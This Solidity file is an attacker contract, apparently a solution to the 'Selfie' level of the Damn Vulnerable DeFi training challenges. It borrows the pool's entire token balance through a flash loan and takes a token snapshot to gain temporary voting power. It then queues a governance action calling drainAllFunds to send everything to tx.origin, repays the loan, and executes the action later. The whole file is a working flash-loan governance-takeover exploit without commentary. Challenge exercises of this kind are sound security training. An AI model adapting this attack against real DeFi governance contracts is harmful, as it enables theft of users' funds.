
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttacker {
    
    SelfiePool pool;
    DamnValuableTokenSnapshot token;
    SimpleGovernance govToken;
    uint256 actionId;
    constructor(address _pool, address _govToken, address _tokenAddr) {

        pool = SelfiePool(_pool);
        govToken = SimpleGovernance(_govToken);
        token = DamnValuableTokenSnapshot(_tokenAddr);
    }

    function attack() external {

        pool.flashLoan(token.balanceOf(address(pool)));

    }

    function receiveTokens(address tokenAddr, uint256 amount) external {


        token.snapshot();

        bytes memory callData = abi.encodeWithSignature(
            "drainAllFunds(address)", 
            tx.origin
            );

        actionId = govToken.queueAction(
            address(pool), 
            callData, 
            0
            ); 

        token.transfer(address(pool), amount);
    }

    function execute() external {
        govToken.executeAction(actionId);
    }
}
